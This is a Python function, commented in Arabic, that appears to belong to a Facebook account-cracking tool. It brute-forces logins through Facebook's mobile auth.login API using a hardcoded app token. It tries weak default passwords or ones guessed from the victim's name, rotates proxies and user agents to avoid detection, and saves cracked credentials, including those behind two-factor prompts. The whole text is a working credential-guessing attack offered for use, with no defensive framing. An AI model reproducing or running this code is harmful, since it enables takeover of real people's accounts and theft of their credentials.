def CORE_LOGIN_ENGINE(uid, info, method):
    """
    المحرك الرئيسي الذي يقوم بعملية الاقتحام وفحص الاستجابة.
    تم تصميمه ليكون صامتاً، سريعاً، ودقيقاً في كشف السيكور.
    """
    global loop, oks, cps, twf
    
    # تحديث العداد في سطر واحد لضمان عدم حدوث اضطراب في الشاشة
    sys.stdout.write(f'\r{W} [MOHA-02] {loop} | {G}OK:{len(oks)} {R}CP:{len(cps)} {B}2FA:{len(twf)} {W}')
    sys.stdout.flush()

    # تحديد قائمة الباسووردات بناءً على نوع الهجوم
    if method == "OLD_HUNT":
        # باسووردات افتراضية قوية للحسابات القديمة
        pass_list = ["123456", "1234567", "12345678", "password", "123123", "789456"]
    elif method == "FILE_CRACK":
        # استخدام خوارزمية التوليد الذكي من اسم الضحية
        pass_list = GENERATE_SMART_PASSWORDS(info)
    elif method == "SINGLE_CRACK":
        # في حالة التخمين المستهدف، نعتبر 'info' هو الباسوورد القادم من الملف
        pass_list = [info]

    # بدء محاولات الدخول لكل باسوورد
    for pwd in pass_list:
        if len(pwd) < 6: continue
        ua = random.choice(user_agents) if user_agents else GENERATE_ADVANCED_UA()
        proxy = {"http": f"http://{random.choice(proxies)}", "https": f"http://{random.choice(proxies)}"} if proxies else None
        
        try:
            session = requests.Session()
            # استخدام واجهة API مخصصة للأندرويد لضمان السرعة
            url = "https://b-api.facebook.com/method/auth.login"
            params = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "format": "JSON",
                "sdk_version": "2",
                "email": uid,
                "password": pwd,
                "datr": str(uuid.uuid4()),
                "sdk": "ios",
                "generate_session_cookies": "1",
                "sig": "3f555f99148df979a6d45e07661841b"
            }
            
            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "b-api.facebook.com"
            }
            
            # إرسال الطلب (POST)
            response = session.post(url, data=params, headers=headers, proxies=proxy, timeout=15).json()

            # تحليل النتيجة بدقة احترافية
            if "session_key" in response or "access_token" in response:
                # [✓] حساب مفتوح بنجاح
                with threading.Lock():
                    print(f"\r{G} [MOHA-OK] {uid} | {pwd} {W}          ")
                    oks.append(uid)
                    SAVE_RESULT(uid, pwd, "OK")
                break # الانتقال للآيدي التالي

            elif "two_factor_required" in str(response) or "232" in str(response.get("error_code")):
                # [B] حساب سيكور (2FA) - باسوورد صحيح لكن يحتاج كود
                with threading.Lock():
                    print(f"\r{B} [MOHA-2FA] {uid} | {pwd} {W}          ")
                    twf.append(uid)
                    SAVE_RESULT(uid, pwd, "2FA")
                break

            elif "www.facebook.com" in response.get("error_msg", "") or "405" in str(response.get("error_code")):
                # [R] حساب مقفل (Checkpoint)
                with threading.Lock():
                    # لا نطبع المقفل لكي لا نزعج المستخدم، فقط نحفظه
                    cps.append(uid)
                    SAVE_RESULT(uid, pwd, "CP")
                break

            elif "calls_limit" in str(response):
                # نظام حماية من ضغط الطلبات
                time.sleep(10)
            
        except Exception as e:
            # في حال حدوث خطأ في الاتصال، ننتقل للباسورد التالي بهدوء
            continue
            
    loop += 1

